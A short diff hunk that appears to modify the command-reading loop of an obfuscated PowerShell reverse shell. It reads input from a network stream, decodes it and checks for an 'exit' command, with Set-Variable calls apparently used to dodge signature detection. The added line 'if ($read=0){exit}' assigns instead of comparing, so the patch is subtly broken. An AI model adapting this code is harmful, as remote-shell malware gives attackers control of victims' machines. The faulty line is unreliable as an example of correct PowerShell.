@@ -11,6 +11,7 @@ do
         Set-Variable -Name res -Value ("")
         while($stream.DataAvailable -or $read -eq $null) {
                 Set-Variable -Value ($stream.Read($buffer, 0, 1024)) -Name read
+                if ($read=0){exit}
         }
         Set-Variable -Name out -Value ($encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n",""));
         if(!$out.equals("exit")){
